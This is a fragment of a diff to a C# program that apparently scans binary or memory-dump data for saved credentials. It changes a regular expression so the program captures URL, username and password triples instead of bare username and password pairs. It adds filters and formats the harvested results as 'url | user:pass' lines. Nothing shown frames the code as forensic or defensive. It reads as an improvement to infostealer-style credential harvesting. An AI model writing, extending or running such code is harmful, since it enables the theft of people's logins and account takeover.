@@ -262,12 +262,12 @@ class Program
                                 foreach (string line in lines)
                                 {
                                     /*
-                                       ORIGINAL STYLE REGEX
-                                       username + password pair near https
+                                       ENHANCED REGEX
+                                       Captures URL + username + password
                                     */
 
                                     string pattern =
-                                        @"[a-zA-Z]https?\x20([a-zA-Z0-9\\._@\-]{1,64})\x20([^\x00\s]{1,64})\x20\x00";
+                                        @"[a-zA-Z](https?://[a-zA-Z0-9\.\-_/]+)\x20([a-zA-Z0-9\\._@\-]{1,64})\x20([^\x00\s]{1,64})\x20\x00";
 
                                     MatchCollection matches =
                                         Regex.Matches(
@@ -279,21 +279,27 @@ class Program
                                     {
                                         try
                                         {
-                                            string username =
+                                            string url =
                                                 match.Groups[1].Value
                                                 .Trim();
 
-                                            string password =
+                                            string username =
                                                 match.Groups[2].Value
                                                 .Trim();
 
+                                            string password =
+                                                match.Groups[3].Value
+                                                .Trim();
+
                                             if (
+                                                url.Length < 8 ||
                                                 username.Length < 2 ||
                                                 password.Length < 2
                                             )
                                                 continue;
 
                                             if (
+                                                !IsPrintable(url) ||
                                                 !IsPrintable(username) ||
                                                 !IsPrintable(password)
                                             )
@@ -305,23 +311,20 @@ class Program
 
                                             if (
                                                 username.Contains("https") ||
-                                                password.Contains("https")
-                                            )
-                                                continue;
-
-                                            if (
+                                                password.Contains("https") ||
                                                 username.Contains("microsoft") ||
                                                 password.Contains("microsoft")
                                             )
                                                 continue;
 
                                             if (
-                                                password.Length > 64
+                                                password.Length > 64 ||
+                                                url.Length > 200
                                             )
                                                 continue;
 
                                             string combined =
-                                                $"{username}:{password}";
+                                                $"{url} | {username}:{password}";
 
                                             if (!seen.Contains(combined))
                                             {
